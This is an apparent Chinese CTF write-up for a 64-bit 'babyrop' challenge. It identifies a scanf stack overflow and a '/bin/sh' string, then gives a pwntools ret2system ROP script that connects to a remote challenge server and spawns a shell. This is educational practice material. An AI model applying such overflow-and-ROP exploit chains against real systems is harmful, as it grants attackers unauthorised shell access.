首先检查安全机制

![image-20201105114634910](https://static.hack1s.fun/images/2021/02/06/image-20201105114634910.png)

开启了NX，是64位的程序

在IDA中反编译main函数

![image-20201105114754145](https://static.hack1s.fun/images/2021/02/06/image-20201105114754145.png)

输入了一个v4，之后输出，这里的scanf存在溢出

数据段中存在一个后门字符串

![image-20201105114914833](https://static.hack1s.fun/images/2021/02/06/image-20201105114914833.png)

思路就是溢出返回地址，之后调用system函数

payload还是比较简单的，和之前例子差不多

```python
from pwn import *

#io = process('./babyrop')
io = remote('node3.buuoj.cn',25747)
elf = ELF('./babyrop')

bin_sh = elf.sym['binsh']

io.recvuntil('name? ')
pop_rdi = 0x400683

payload = 'a'*0x10 + 'b'*0x8 + p64(pop_rdi) +  p64(bin_sh) + p64(elf.sym['system'])

io.sendline(payload)

io.interactive()
```

但是拿到shell之后发现flag居然不在根目录，少见

![image-20201105120131498](https://static.hack1s.fun/images/2021/02/06/image-20201105120131498.png)

